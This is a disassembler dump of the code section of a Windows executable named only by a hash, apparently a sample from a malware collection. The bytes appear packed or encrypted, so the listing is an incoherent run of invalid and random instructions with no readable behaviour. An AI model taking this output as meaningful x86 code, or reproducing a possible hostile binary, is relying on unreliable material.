
d24c898342ecb26b1a44bcb207b7b6a3d8f377253faa96c1c04b8d0980327411.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411001:	push   ebx
  411002:	or     al,0x62
  411004:	in     eax,0x86
  411006:	sbb    eax,0x798bc818
  41100b:	gs ret 
  41100d:	and    eax,0x585d522b
  411012:	shl    DWORD PTR [edx+eax*2-0x23d72606],0xf0
  41101a:	push   edx
  41101b:	imul   ebx,DWORD PTR [esp+edx*4],0xffffff8d
  41101f:	jae    0x411073
  411021:	push   cs
  411022:	sub    esi,DWORD PTR [ebp-0x66]
  411025:	in     al,dx
  411026:	jnp    0x411043
  411028:	test   eax,0x153c194c
  41102d:	xor    eax,0x972cec3f
  411032:	fwait
  411033:	aaa    
  411034:	test   al,0x52
  411036:	and    al,0xc7
  411038:	aad    0x67
  41103a:	test   BYTE PTR [ebx-0x49c7224f],dh
  411040:	push   cs
  411041:	fwait
  411042:	cmp    BYTE PTR ds:[eax],al
  411045:	and    al,0xfb
  411047:	lods   al,BYTE PTR ds:[esi]
  411048:	loope  0x411053
  41104a:	push   ebp
  41104b:	loop   0x41108f
  41104d:	push   esi
  41104e:	jl     0x410ff2
  411050:	ror    esi,1
  411052:	sub    eax,0x9cfacf1e
  411057:	lahf   
  411058:	mov    bl,0x59
  41105a:	cmp    DWORD PTR [esi+0x51],edx
  41105d:	fist   DWORD PTR [ebp+ebx*1+0x2c]
  411061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411062:	xchg   ebx,eax
  411063:	(bad)  
  411064:	mov    ebx,0xdfd4d83d
  411069:	pop    eax
  41106a:	push   esi
  41106b:	pop    ebp
  41106c:	dec    ebx
  41106d:	jno    0x4110c8
  41106f:	sub    ch,BYTE PTR [ecx+0x19]
  411072:	fcomp  st(3)
  411074:	xor    eax,DWORD PTR [esi+0xd]
  411077:	test   DWORD PTR [ecx],ebx
  411079:	xchg   esi,eax
  41107a:	pop    esi
  41107b:	leave  
  41107c:	push   ecx
  41107d:	and    DWORD PTR [ebp-0x1e],edx
  411080:	jns    0x411049
  411082:	mov    esp,edi
  411084:	jmp    0xee993600
  411089:	dec    esp
  41108a:	xor    ebp,0x909296ea
  411090:	and    eax,0x14a0628
  411095:	or     eax,0xa6090952
  41109a:	xchg   esi,eax
  41109b:	ins    DWORD PTR es:[edi],dx
  41109c:	repz fld DWORD PTR [ebp+0x18686c5]
  4110a3:	sbb    DWORD PTR [edi],0x15
  4110a6:	rol    DWORD PTR [edi+0x3294d9a0],cl
  4110ac:	inc    esp
  4110ad:	cmp    al,0xc5
  4110af:	ins    DWORD PTR es:[edi],dx
  4110b0:	fisub  WORD PTR [edi+ecx*2+0x5f]
  4110b4:	int3   
  4110b5:	lock jns 0x41112b
  4110b8:	test   al,0x19
  4110ba:	aas    
  4110bb:	dec    ecx
  4110bc:	fs mov dh,0x78
  4110bf:	jmp    0x374e448e
  4110c4:	call   0xed0e:0xec61bae2
  4110cb:	cmp    al,0x2f
  4110cd:	inc    esp
  4110ce:	xchg   ecx,eax
  4110cf:	pushfw 
  4110d1:	imul   esp,DWORD PTR [eax],0x8b36a260
  4110d7:	pop    ecx
  4110d8:	pop    eax
  4110d9:	out    0x74,al
  4110db:	gs push ebx
  4110dd:	retf   0x9ce9
  4110e0:	outs   dx,BYTE PTR ds:[esi]
  4110e1:	bound  edi,QWORD PTR [edi+0x24]
  4110e4:	iret   
  4110e5:	xor    eax,0x34ebd007
  4110ea:	jne    0x4110b4
  4110ec:	sbb    cl,BYTE PTR [esi]
  4110ee:	rcl    BYTE PTR [edi+0x30c41161],0xc5
  4110f5:	mov    eax,ds:0xa3845535
  4110fa:	js     0x411092
  4110fc:	sub    eax,0xb2016f7a
  411101:	and    eax,DWORD PTR ds:0xba269b2d
  411107:	mov    DWORD PTR [eax+eax*8+0x1f14d619],ecx
  41110e:	stos   DWORD PTR es:[edi],eax
  41110f:	pusha  
  411110:	call   0xe06f:0x2a6acba1
  411117:	xchg   edx,eax
  411118:	or     eax,0x1fde7051
  41111d:	push   ebp
  41111e:	hlt    
  41111f:	push   esp
  411120:	call   0x94cf:0x98638ddc
  411127:	retf   
  411128:	pop    eax
  411129:	xchg   ebp,eax
  41112a:	dec    ebx
  41112b:	xchg   ebp,eax
  41112c:	and    BYTE PTR [edi-0x2dce129],al
  411132:	test   DWORD PTR [ebx],0xfdbf99ac
  411138:	and    al,0xd2
  41113a:	call   0x3bfb454b
  41113f:	into   
  411140:	adc    DWORD PTR [edx],ebx
  411142:	mov    edx,0x4f9eee0d
  411147:	xor    al,0x54
  411149:	and    al,0x84
  41114b:	push   esp
  41114c:	ins    BYTE PTR es:[edi],dx
  41114d:	and    eax,0x31230d73
  411152:	jnp    0x41113d
  411154:	mov    ds:0x81a27cf7,eax
  411159:	cmp    ch,0x8d
  41115c:	mov    al,0x93
  41115e:	xadd   BYTE PTR [esp+edx*8],ah
  411162:	mov    edx,0x8456b6b8
  411167:	aas    
  411168:	or     cl,BYTE PTR [ecx+0x2d50f4ce]
  41116e:	cdq    
  41116f:	cld    
  411170:	jnp    0x4111d3
  411172:	adc    edi,DWORD PTR [ebx]
  411174:	stos   DWORD PTR es:[edi],eax
  411175:	test   BYTE PTR [edi],al
  411177:	ins    DWORD PTR es:[edi],dx
  411178:	leave  
  411179:	stc    
  41117a:	test   BYTE PTR [edx],cl
  41117c:	dec    ebx
  41117d:	repnz stos DWORD PTR es:[edi],eax
  41117f:	pushf  
  411180:	mov    bh,BYTE PTR [ecx*8-0x58b950cd]
  411187:	and    BYTE PTR [eax+0x44],bh
  41118a:	aaa    
  41118b:	pusha  
  41118c:	sbb    ebp,DWORD PTR [edi+0x23946577]
  411192:	inc    edx
  411193:	xchg   DWORD PTR [eax+edx*8],esi
  411196:	std    
  411197:	sub    eax,0x897712e6
  41119c:	cmp    DWORD PTR [edi-0x2f],edx
  41119f:	xor    cl,bl
  4111a1:	xchg   ebx,eax
  4111a2:	cmp    DWORD PTR [ecx],esi
  4111a4:	lods   eax,DWORD PTR ds:[esi]
  4111a5:	dec    ebx
  4111a6:	adc    ch,bh
  4111a8:	ja     0x4111f5
  4111aa:	mov    ch,0x6a
  4111ac:	adc    eax,0xf126c382
  4111b1:	pushf  
  4111b2:	mov    dl,0x77
  4111b4:	mov    ch,0xd6
  4111b6:	loop   0x411185
  4111b8:	xchg   BYTE PTR [edi+eax*2-0x2271f141],ah
  4111bf:	pop    eax
  4111c0:	adc    edx,edx
  4111c2:	jmp    0x41123b
  4111c4:	les    eax,FWORD PTR cs:[eax-0x16be5407]
  4111cb:	mov    al,ds:0xff429465
  4111d0:	idiv   DWORD PTR [ecx+0x6fa2cf55]
  4111d6:	bswap  edx
  4111d8:	std    
  4111d9:	ins    BYTE PTR es:[edi],dx
  4111da:	lock in eax,0x44
  4111dd:	sbb    DWORD PTR [ebp+0x6555047c],eax
  4111e3:	test   BYTE PTR [esi-0x5246d5ef],al
  4111e9:	pusha  
  4111ea:	clc    
  4111eb:	dec    ebx
  4111ec:	push   ds
  4111ed:	and    al,0x6d
  4111ef:	mov    ecx,0xe22665c3
  4111f4:	ret    
  4111f5:	aam    0x3b
  4111f7:	push   ecx
  4111f8:	xor    cl,0xbd
  4111fb:	adc    bl,BYTE PTR [edi-0x2d]
  4111fe:	jg     0x41122d
  411200:	push   es
  411201:	js     0x4111e2
  411203:	out    dx,eax
  411204:	mov    al,0x35
  411206:	pop    esp
  411207:	add    eax,0x3a063c7d
  41120c:	lds    edx,FWORD PTR [eax+0x6a644521]
  411212:	pop    esi
  411213:	xor    dh,al
  411215:	mov    cl,0x80
  411217:	mov    eax,ds:0x3181689b
  41121c:	mov    dl,0xc
  41121e:	mov    ah,0xd5
  411220:	jge    0x4111f5
  411222:	mov    dh,0xfc
  411224:	stc    
  411225:	bound  esi,QWORD PTR [ebp+0x4bbe81c7]
  41122b:	pop    ss
  41122c:	ret    
  41122d:	mov    esi,0x65bd0dd8
  411232:	add    al,0xfe
  411234:	rcr    BYTE PTR [ecx-0x465c8a07],cl
  41123a:	or     DWORD PTR [ebx-0x32],eax
  41123d:	out    0x61,al
  41123f:	push   ds
  411240:	mov    ecx,gs
  411242:	(bad)  [eax]
  411244:	or     al,0xc6
  411246:	int3   
  411247:	imul   ebx,DWORD PTR [edi],0x7a
  41124a:	sti    
  41124b:	ret    0xf6ab
  41124e:	dec    esi
  41124f:	jmp    0x7dd29a07
  411254:	mov    ebx,edi
  411256:	jb     0x411223
  411258:	sub    BYTE PTR [edx],cl
  41125a:	xchg   esp,eax
  41125b:	stc    
  41125c:	jle    0x411278
  41125e:	lea    esi,ds:0xea61fbcf
  411264:	je     0x41126c
  411266:	fwait
  411267:	mov    ebp,0xc8ecf713
  41126c:	hlt    
  41126d:	add    dh,al
  41126f:	sbb    eax,0xfffffff9
  411272:	retf   0xb837
  411275:	out    0xb6,eax
  411277:	sub    BYTE PTR [esp+esi*8+0x1e625bf1],0x5e
  41127f:	aaa    
  411280:	mov    ebp,0xd17aac0
  411285:	fmul   QWORD PTR [bp+si-0x373a]
  41128a:	into   
  41128b:	jae    0x41125c
  41128d:	es cld 
  41128f:	or     DWORD PTR [ebp-0x29f7eb48],esi
  411295:	fs pop edi
  411297:	lahf   
  411298:	jmp    0xfd481f7
  41129d:	add    BYTE PTR [esi-0x4d],al
  4112a0:	jnp    0x411257
  4112a2:	mov    ah,0xc2
  4112a4:	addr16 add eax,0x700244b2
  4112aa:	mov    ah,0x59
  4112ac:	push   ss
  4112ad:	inc    ebx
  4112ae:	shr    DWORD PTR [ebx],0x82
  4112b1:	xchg   DWORD PTR [ecx],edi
  4112b3:	imul   edi,DWORD PTR [ebp+eax*2+0x192f49a9],0x69924eab
  4112be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112bf:	(bad)  
  4112c0:	and    DWORD PTR es:[ebp+esi*2-0x35],esp
  4112c5:	sub    ebp,edx
  4112c7:	jecxz  0x4112b1
  4112c9:	or     al,0x2a
  4112cb:	xchg   ebx,eax
  4112cc:	and    DWORD PTR [ebp+0x36fd97ed],edx
  4112d2:	jmp    0x763a:0xf0bade34
  4112d9:	adc    DWORD PTR [eax],ebx
  4112db:	mov    cl,0xac
  4112dd:	stc    
  4112de:	cmp    ch,BYTE PTR [esi-0x45d6d304]
  4112e4:	lods   al,BYTE PTR ds:[esi]
  4112e5:	mov    eax,ds:0xd58f0d41
  4112ea:	jg     0x4112ac
  4112ec:	dec    edx
  4112ed:	mov    esi,0x5053c826
  4112f2:	mov    bl,0xfa
  4112f4:	dec    ecx
  4112f5:	repnz mov ebp,DWORD PTR [ecx+0x6c]
  4112f9:	imul   eax,DWORD PTR [ebx],0x5a117326
  4112ff:	retf   
  411300:	cwde   
  411301:	(bad)  
  411302:	lahf   
  411303:	(bad)  
  411305:	sbb    ebp,ecx
  411307:	lea    edi,[edx-0x413c4441]
  41130d:	dec    edx
  41130e:	add    dl,BYTE PTR [eax]
  411310:	mov    DWORD PTR [ebx*8-0x17327d28],ebp
  411317:	icebp  
  411318:	(bad)  
  411319:	jmp    0x74ae:0xf024af20
  411320:	jns    0x411339
  411322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411323:	push   ebp
  411324:	jge    0x411316
  411326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411327:	jecxz  0x411389
  411329:	mov    bh,0xfd
  41132b:	adc    eax,0x93e08203
  411330:	sub    eax,0xd4060e59
  411335:	(bad)  
  411336:	fadd   DWORD PTR [esi]
  411338:	sub    DWORD PTR [esi+esi*8],edi
  41133b:	fmul   DWORD PTR [ebp-0x69]
  41133e:	mov    cl,0x28
  411340:	cmp    eax,0x6d14ca48
  411345:	mov    esp,0xb0568fb9
  41134a:	dec    edi
  41134b:	pop    ebx
  41134d:	dec    ebx
  41134e:	mov    edx,DWORD PTR [ebx-0x22f3853e]
  411354:	lea    esp,[edx-0x2e42cec8]
  41135a:	jae    0x41136d
  41135c:	mov    DWORD PTR [ebx+0x1869608c],esp
  411362:	pop    es
  411363:	sbb    eax,0x4e94429d
  411368:	sbb    edx,eax
  41136a:	pop    ecx
  41136b:	adc    BYTE PTR [ebx+0x264b75d7],dh
  411371:	mov    eax,ds:0x5596b1fa
  411376:	or     BYTE PTR [esi],al
  411378:	cli    
  411379:	inc    eax
  41137a:	pop    ebp
  41137b:	push   ebp
  41137c:	mov    eax,ds:0x697c8fdd
  411381:	xchg   esi,eax
  411382:	xchg   esp,eax
  411383:	xchg   edx,eax
  411384:	jmp    0x41137c
  411386:	lods   eax,DWORD PTR ds:[esi]
  411387:	dec    edx
  411388:	in     eax,0x9
  41138a:	push   0xffffffb6
  41138c:	enter  0x2f56,0x1
  411390:	and    al,0x38
  411392:	add    al,0xa3
  411394:	int    0xcd
  411396:	rep lods al,BYTE PTR ds:[esi]
  411398:	jge    0x41136e
  41139a:	ins    DWORD PTR es:[edi],dx
  41139b:	lock xchg BYTE PTR [eax],ch
  41139e:	(bad)  
  41139f:	fisttp DWORD PTR [eax+0x76]
  4113a2:	rcl    BYTE PTR [ebx+0x62],cl
  4113a5:	leave  
  4113a6:	enter  0xe39b,0x8c
  4113aa:	shl    ecx,cl
  4113ac:	ret    
  4113ad:	jbe    0x411343
  4113af:	sbb    cl,BYTE PTR [esp+edx*4+0x2f4bfca2]
  4113b6:	cdq    
  4113b7:	fwait
  4113b8:	inc    eax
  4113b9:	push   ebx
  4113ba:	sbb    eax,0x742541ec
  4113bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113c0:	inc    ebp
  4113c1:	aad    0x2e
  4113c3:	ins    DWORD PTR es:[edi],dx
  4113c4:	cmp    esi,esp
  4113c6:	je     0x4113e4
  4113c8:	pop    edx
  4113c9:	enter  0xcaf8,0xa6
  4113cd:	sysexit 
  4113cf:	add    DWORD PTR [ebp+0x7],edi
  4113d2:	fs loope 0x41144d
  4113d5:	pop    ebp
  4113d6:	fist   DWORD PTR [edx+0x18]
  4113d9:	inc    esi
  4113da:	or     dl,0xc5
  4113dd:	adc    eax,0xa6e0323e
  4113e2:	fwait
  4113e3:	imul   edi,esi,0x2ab1bdbe
  4113e9:	in     eax,dx
  4113ea:	jns    0x4113b9
  4113ec:	sub    al,0x47
  4113ee:	lahf   
  4113ef:	int3   
  4113f0:	jb     0x4113d6
  4113f2:	cwde   
  4113f3:	arpl   WORD PTR [edi+esi*8-0x584043c4],bx
  4113fa:	inc    ebp
  4113fb:	test   DWORD PTR [edx],esp
  4113fd:	adc    eax,0xdaffb1de
  411402:	xor    eax,0x67a0a335
  411407:	inc    edi
  411408:	int    0xbf
  41140a:	repnz daa 
  41140c:	mov    gs:0x5688b823,eax
  411412:	loope  0x4113b7
  411414:	fimul  DWORD PTR [ebp+0x71]
  411417:	mov    ?,ebx
  411419:	fs xchg edx,eax
  41141b:	adc    al,BYTE PTR [edx+0x89b7bcd]
  411421:	nop
  411422:	in     eax,dx
  411423:	std    
  411424:	dec    ebx
  411425:	aad    0x5a
  411427:	(bad)  
  41142a:	mov    ch,0xb3
  41142c:	mov    bl,0x97
  41142e:	push   ecx
  41142f:	mov    eax,ds:0xc8cbede7
  411434:	(bad)  
  411435:	fstp   TBYTE PTR [ecx]
  411437:	mov    WORD PTR [edx-0x1ff69d48],es
  41143d:	(bad)  
  41143f:	cs cld 
  411441:	aaa    
  411442:	sbb    bh,BYTE PTR [ecx-0x11]
  411445:	jns    0x41142d
  411447:	scas   al,BYTE PTR es:[edi]
  411448:	sbb    eax,edi
  41144a:	test   ebx,ebx
  41144c:	daa    
  41144d:	mov    eax,DWORD PTR [eax]
  41144f:	pop    ds
  411450:	jne    0x41147a
  411452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411453:	enter  0xeb7b,0x59
  411457:	pop    ebp
  411458:	xor    cl,BYTE PTR es:[ecx+0x4bbfb58]
  41145f:	jnp    0x41148d
  411461:	(bad)  
  411462:	push   esp
  411463:	jmp    0x6230534b
  411468:	adc    BYTE PTR [ebx+0x50],bl
  41146b:	das    
  41146c:	aad    0xbd
  41146e:	mov    esp,0x7a2262e0
  411473:	lods   eax,DWORD PTR ds:[esi]
  411474:	xor    edx,DWORD PTR [esi+0x2b60077d]
  41147a:	nop
  41147b:	push   DWORD PTR [eax+0x2ef2c0c0]
  411481:	jns    0x411447
  411483:	jne    0x41144c
  411485:	daa    
  411486:	mov    DWORD PTR [edi+0x3f8522a6],eax
  41148c:	ret    0xb006
  41148f:	adc    ecx,DWORD PTR es:0xf817e0f5
  411496:	inc    esp
  411497:	mov    esi,0xa4f6d079
  41149c:	pop    es
  41149d:	je     0x41142b
  41149f:	fbstp  TBYTE PTR [edi+0x2409dbc7]
  4114a5:	lea    esp,[edx]
  4114a7:	xor    DWORD PTR [eax],edx
  4114a9:	es xchg ebp,eax
  4114ab:	xchg   ebp,eax
  4114ac:	ja     0x411468
  4114ae:	sub    BYTE PTR [esi+0x63],bh
  4114b1:	retf   0x1905
  4114b4:	sub    al,0x89
  4114b6:	fs xchg ecx,eax
  4114b8:	sti    
  4114b9:	cs stos DWORD PTR es:[edi],eax
  4114bb:	push   es
  4114bc:	or     ecx,DWORD PTR [ecx-0x4d]
  4114bf:	scas   eax,DWORD PTR es:[edi]
  4114c0:	inc    ecx
  4114c1:	(bad)  
  4114c3:	call   0xaee9d42f
  4114c8:	and    eax,0x71604bfe
  4114cd:	ror    BYTE PTR [ecx+0x1c],cl
  4114d0:	xchg   edi,eax
  4114d1:	jo     0x4114d4
  4114d3:	icebp  
  4114d4:	scas   al,BYTE PTR es:[edi]
  4114d5:	or     DWORD PTR [ebp+0x72],eax
  4114d8:	xor    esi,DWORD PTR [edx]
  4114da:	pop    ebx
  4114db:	adc    DWORD PTR [ecx-0x4c],0xb
  4114df:	adc    al,0xac
  4114e1:	imul   ebp,eax,0x61
  4114e4:	pop    esi
  4114e5:	scas   eax,DWORD PTR es:[edi]
  4114e6:	sub    eax,0x52d096bd
  4114eb:	mov    bl,0xda
  4114ed:	push   ebp
  4114ee:	and    eax,esi
  4114f0:	fistp  WORD PTR [esi+0x4a1feda8]
  4114f6:	nop
  4114f7:	or     al,0x30
  4114f9:	dec    edi
  4114fa:	ret    
  4114fb:	mov    edx,0x9c71a6b7
  411500:	sub    al,0x30
  411502:	sub    dl,BYTE PTR [edi+0x6d]
  411505:	enter  0xaefd,0x81
  411509:	cmp    BYTE PTR [edx],ch
  41150b:	sub    eax,edi
  41150d:	cmp    BYTE PTR [eax+0x104b33e6],al
  411513:	mov    DWORD PTR [esi+eax*2-0xe332c55],eax
  41151a:	mov    ecx,DWORD PTR [edx]
  41151c:	pop    esp
  41151d:	call   0x7d83:0x1ad883a
  411524:	push   edi
  411525:	mov    ah,0xff
  411527:	lods   eax,DWORD PTR ds:[esi]
  411528:	mov    ebp,0x2dc5529f
  41152d:	add    BYTE PTR [edi],bl
  41152f:	xchg   esp,eax
  411530:	xlat   BYTE PTR ds:[ebx]
  411531:	sahf   
  411532:	adc    BYTE PTR [ebx-0x7c],0x35
  411536:	ret    0x5a39
  411539:	ds pop ebp
  41153b:	adc    ebx,DWORD PTR [ebp+0x8921319]
  411541:	or     ebp,esi
  411543:	mov    dl,0xf7
  411545:	ret    
  411546:	adc    ch,BYTE PTR [ebx-0x1b]
  411549:	stc    
  41154a:	fld    TBYTE PTR [ebp-0x6feb6339]
  411550:	fisttp QWORD PTR [ecx]
  411552:	cld    
  411553:	not    DWORD PTR [ebx]
  411555:	sar    BYTE PTR [edi+0x2bd17cc],0x64
  41155c:	loop   0x4115a7
  41155e:	push   esi
  41155f:	pop    ss
  411560:	cmp    DWORD PTR [ebx+0x23b70c0f],esp
  411566:	adc    eax,0xb8752cd1
  41156b:	imul   ebx,DWORD PTR [edx-0x50e85a9b],0x1a
  411572:	cmp    edi,DWORD PTR [esi+0x6968e415]
  411578:	push   edi
  411579:	push   0x73
  41157b:	and    eax,0xbd8b0c54
  411580:	retf   0xdd65
  411583:	jmp    0x2606:0x2f7a10bb
  41158a:	lock pop ecx
  41158c:	and    ah,BYTE PTR [ebx-0x689ddd38]
  411592:	xchg   edx,eax
  411593:	lods   eax,DWORD PTR ds:[esi]
  411594:	mov    dh,0x3a
  411596:	mov    dh,0x16
  411598:	ja     0x411530
  41159a:	mov    ds:0xb9a8b758,al
  41159f:	mov    es,WORD PTR [ecx]
  4115a1:	inc    esp
  4115a2:	jnp    0x411583
  4115a4:	lods   al,BYTE PTR ds:[esi]
  4115a5:	int    0xc5
  4115a7:	mov    esp,0xcf49949b
  4115ac:	out    0xae,eax
  4115ae:	addr16 dec ebx
  4115b0:	or     BYTE PTR [ebx+edx*1+0x7614d046],bh
  4115b7:	cmp    BYTE PTR [edx+0x5ffbf4d0],al
  4115bd:	inc    esp
  4115be:	adc    DWORD PTR [edi],esi
  4115c0:	loopne 0x411554
  4115c2:	mov    ebx,0xe7874fa0
  4115c7:	dec    edi
  4115c8:	dec    ebx
  4115c9:	push   esi
  4115ca:	mov    al,0xb0
  4115cc:	sbb    ecx,DWORD PTR [eax]
  4115ce:	inc    eax
  4115cf:	xor    BYTE PTR [ebx+0x37],bl
  4115d2:	jg     0x4115bc
  4115d4:	jo     0x411563
  4115d6:	mov    ebx,0x62898d3d
  4115db:	jmp    FWORD PTR [edi]
  4115dd:	fdiv   QWORD PTR [edx]
  4115df:	or     eax,esp
  4115e1:	add    DWORD PTR [ecx+0x72],0x8609a625
  4115e8:	xor    DWORD PTR ds:0xe1f3f9fb,edi
  4115ee:	jne    0x41162f
  4115f0:	test   al,0x9a
  4115f2:	mov    ah,0xf2
  4115f4:	or     DWORD PTR [esi-0x6aace19f],esi
  4115fa:	xlat   BYTE PTR es:[ebx]
  4115fc:	mov    dl,0x46
  4115fe:	div    cl
  411600:	push   ds
  411601:	inc    ebp
  411602:	mov    al,ds:0xd0f47f40
  411607:	push   cs
  411608:	sar    DWORD PTR [ebx],1
  41160a:	mov    DWORD PTR [eax+0xba01c89],edi
  411610:	test   DWORD PTR [edx+esi*4+0x5322b11a],edi
  411617:	jmp    0xa61141c6
  41161c:	aaa    
  41161d:	ds test ecx,ecx
  411620:	repnz mul DWORD PTR [edi+edi*1]
  411624:	adc    ebx,ecx
  411626:	clc    
  411627:	inc    esi
  411628:	mov    cl,0x5c
  41162a:	xor    al,0x78
  41162c:	mov    si,0x8825
  411630:	cmp    DWORD PTR [eax-0x6f],0xb4c2bbbf
  411637:	icebp  
  411638:	gs inc edx
  41163a:	cmp    esi,DWORD PTR [esi-0x1fe6317a]
  411640:	fwait
  411641:	or     eax,0xf1b1b40d
  411646:	xor    DWORD PTR [ebx],edi
  411648:	pop    ss
  411649:	sbb    BYTE PTR [ecx],cl
  41164b:	in     eax,0xac
  41164d:	test   DWORD PTR [edx-0x5b],esi
  411650:	fidiv  WORD PTR [ecx-0xbd7e393]
  411656:	js     0x411634
  411658:	pop    ss
  411659:	scas   eax,DWORD PTR es:[edi]
  41165a:	mov    ebx,0xe11023da
  41165f:	ror    esi,cl
  411661:	mov    edx,0xa2d1fd4c
  411666:	mov    ecx,0xcc8bf857
  41166b:	in     al,0x56
  41166d:	(bad)  
  41166e:	mov    edx,0xd160c8f
  411673:	jae    0x411601
  411675:	pop    ebp
  411676:	(bad)  
  411677:	mov    esp,0x196701ff
  41167c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41167d:	cmp    eax,0xce02d4bb
  411682:	adc    eax,0x5786173b
  411687:	sbb    al,0xbf
  411689:	inc    esp
  41168a:	fabs   
  41168c:	sbb    eax,0x6d87575c
  411691:	mov    ds:0xb77e351,eax
  411696:	cmp    bh,dl
  411698:	(bad)  [esi+0x1a]
  41169b:	test   eax,0xf5dd3c
  4116a0:	xor    esp,DWORD PTR [esi+0x1c]
  4116a3:	loopne 0x4116c0
  4116a5:	fcom   st(0)
  4116a7:	add    ebx,edx
  4116a9:	xchg   ebx,eax
  4116aa:	stos   BYTE PTR es:[edi],al
  4116ab:	mov    eax,ds:0x9ea3d6ed
  4116b0:	fiadd  DWORD PTR [ebx]
  4116b2:	stos   BYTE PTR es:[edi],al
  4116b3:	stc    
  4116b4:	pushf  
  4116b5:	out    0x55,al
  4116b7:	fisttp DWORD PTR [edi-0xdaf513f]
  4116bd:	int3   
  4116be:	xchg   edi,eax
  4116bf:	stos   BYTE PTR es:[edi],al
  4116c0:	jns    0x41170a
  4116c2:	mov    ebp,0x314e9eb7
  4116c7:	bound  esi,QWORD PTR [ebp-0x1ea43db1]
  4116cd:	imul   edi,esi,0xffffffce
  4116d0:	sub    al,0x5f
  4116d2:	cmp    DWORD PTR [esi+0x41],0x48e3a602
  4116d9:	xchg   esp,eax
  4116da:	retf   0xff8c
  4116dd:	dec    ecx
  4116de:	push   cs
  4116df:	sbb    eax,0x6734b107
  4116e4:	add    bh,ah
  4116e6:	mov    ebx,edx
  4116e8:	pop    esp
  4116e9:	mov    ecx,0x5ffeeb59
  4116ee:	jo     0x4116d6
  4116f0:	mov    ds:0xa8fddc13,eax
  4116f5:	adc    BYTE PTR [ebx+0x12639a51],bl
  4116fb:	mov    ah,0xbc
  4116fd:	xor    BYTE PTR [esi+edi*2],cl
  411700:	call   0xed50abe3
  411705:	sbb    eax,DWORD PTR [eax+eax*2+0x6b963183]
  41170c:	rcl    BYTE PTR [esi-0x66cbd041],cl
  411712:	sahf   
  411713:	xchg   edx,eax
  411714:	fld    DWORD PTR [eax]
  411716:	clc    
  411717:	dec    ebp
  411718:	adc    eax,0xdd2a5ce7
  41171d:	fisubr WORD PTR [ecx-0x275d498f]
  411723:	les    edi,FWORD PTR [esp+edi*4]
  411726:	scas   al,BYTE PTR es:[edi]
  411727:	daa    
  411728:	inc    edi
  411729:	loopne 0x4116c8
  41172b:	push   ss
  41172c:	xchg   ebx,ebx
  41172e:	inc    edi
  41172f:	into   
  411730:	jmp    0xb061ff29
  411735:	jle    0x41170e
  411737:	mov    al,BYTE PTR [edx-0x2b]
  41173a:	jl     0x41176b
  41173c:	cmp    dh,BYTE PTR [ecx+0x69]
  41173f:	test   al,0xeb
  411741:	lods   eax,DWORD PTR ds:[esi]
  411742:	bound  eax,QWORD PTR [eax+edi*1-0x3ad5527d]
  411749:	fld    TBYTE PTR [eax]
  41174b:	add    eax,0x9204494b
  411750:	push   ebx
  411751:	xchg   DWORD PTR [edi],edi
  411753:	pop    DWORD PTR [ebx+0x79]
  411756:	add    al,0xab
  411758:	and    ch,al
  41175a:	or     DWORD PTR [eax-0x2b],edi
  41175d:	mov    ebp,0x4cb40bc1
  411762:	inc    edi
  411763:	mov    DWORD PTR [esi-0x2b],ecx
  411766:	adc    eax,0x3f4089de
  41176b:	push   ebp
  41176c:	and    dh,BYTE PTR [eax]
  41176e:	cmc    
  41176f:	adc    dh,dl
  411771:	outs   dx,BYTE PTR ds:[esi]
  411772:	jae    0x41179b
  411774:	lock sti 
  411776:	and    al,0x45
  411778:	test   ecx,0x45a876e4
  41177e:	xchg   ebp,eax
  41177f:	cmp    eax,0xa42e7ad4
  411784:	in     al,dx
  411785:	shl    DWORD PTR [ebp-0x17a4ef79],1
  41178b:	cmp    al,0x85
  41178d:	push   0x19
  41178f:	cmp    al,0xb3
  411791:	test   ah,bh
  411793:	pop    ss
  411794:	adc    BYTE PTR [eax*1-0x2f43b1da],ah
  41179b:	dec    esp
  41179c:	xchg   ebp,eax
  41179d:	jg     0x411807
  41179f:	push   cs
  4117a0:	dec    ebx
  4117a1:	leave  
  4117a2:	cmp    al,0x49
  4117a4:	sti    
  4117a5:	imul   esi,DWORD PTR [ecx+ecx*4+0x7b5ef96c],0xc7252e8f
  4117b0:	dec    eax
  4117b1:	ds push esp
  4117b3:	push   ecx
  4117b4:	test   BYTE PTR [ebx],dh
  4117b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117b7:	ficomp DWORD PTR [eiz*8+0x6beb9b4c]
  4117be:	icebp  
  4117bf:	shl    BYTE PTR [ebp-0x7b],1
  4117c2:	stos   DWORD PTR es:[edi],eax
  4117c3:	cmp    esi,DWORD PTR [edx-0x5eefedd8]
  4117c9:	sbb    ebx,ebp
  4117cb:	sbb    BYTE PTR [edx+ecx*8-0x48520376],dl
  4117d2:	sbb    al,BYTE PTR [ebx+ebp*1+0x5e]
  4117d6:	inc    ecx
  4117d7:	jmp    0x4117ef
  4117d9:	in     al,0x68
  4117db:	or     BYTE PTR [ecx+edx*4-0x7109a499],bh
  4117e2:	inc    DWORD PTR [ebx+0x12]
  4117e5:	add    eax,ebx
  4117e7:	cmp    eax,0xb306328b
  4117ec:	inc    edx
  4117ed:	cld    
  4117ee:	in     al,dx
  4117ef:	into   
  4117f0:	outs   dx,BYTE PTR ds:[esi]
  4117f1:	inc    ecx
  4117f2:	xor    dh,BYTE PTR [ebx]
  4117f4:	fiadd  WORD PTR [esi]
  4117f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117f7:	scas   al,BYTE PTR es:[edi]
  4117f8:	xor    sp,WORD PTR [edi+0x31]
  4117fc:	push   esi
  4117fd:	adc    esi,edi
  4117ff:	lds    ebx,FWORD PTR [ecx]
  411801:	mov    esp,0xf5eec54a
  411806:	mov    esi,0xb6a68066
  41180b:	inc    esi
  41180c:	jb     0x4117e1
  41180e:	xlat   BYTE PTR ds:[ebx]
  41180f:	imul   eax,ebx,0x57
  411812:	sub    ecx,DWORD PTR [ebx-0x5b]
  411815:	pop    esi
  411816:	inc    esi
  411817:	inc    eax
  411818:	nop
  411819:	mov    al,0x5c
  41181b:	imul   dh
